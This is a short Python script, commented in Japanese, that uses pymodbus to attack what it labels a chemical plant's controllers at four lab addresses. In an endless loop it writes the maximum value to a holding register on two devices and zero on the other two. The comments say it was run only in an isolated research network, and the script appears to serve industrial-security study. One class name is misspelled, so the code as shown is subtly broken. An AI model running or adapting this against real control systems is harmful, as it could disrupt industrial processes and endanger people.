# 研究のため、ホストオンリーの環境でのみ使用した

from pymodbus.client import ModbusTcpClient   # ライブラリpymodbusをインポート

client10 = ModbusTcpClient('192.168.95.10')   # クライアントの作成, ChemicalPlant(192.168.95.10 ~ 192.168.95.13)
client11 = ModbusTcpClient('192.168.95.11')
client12 = ModbusTcpClinet('192.168.95.12')
client13 = ModbusTcpClient('192.168.95.13')

try: 

    while True:                                    # 保持レジスタの値にclient10,11に対しては65535を, client12,13に対しては0を書き込むパケットを無限に生成
        res = client10.write_register(1, 65535)
        print("10:", res)
        res = client11.write_register(1, 65535)
        print("11:", res)
        res = client12.write_register(1, 0)
        print("12:", res)
        res = client13.write_register(1, 0)
        print("13:", res)
except KeyboardInterrupt:                         # キーボードを押すとループが終了
    client10.close()
    client11.close()
    client12.close()
    client13.close()
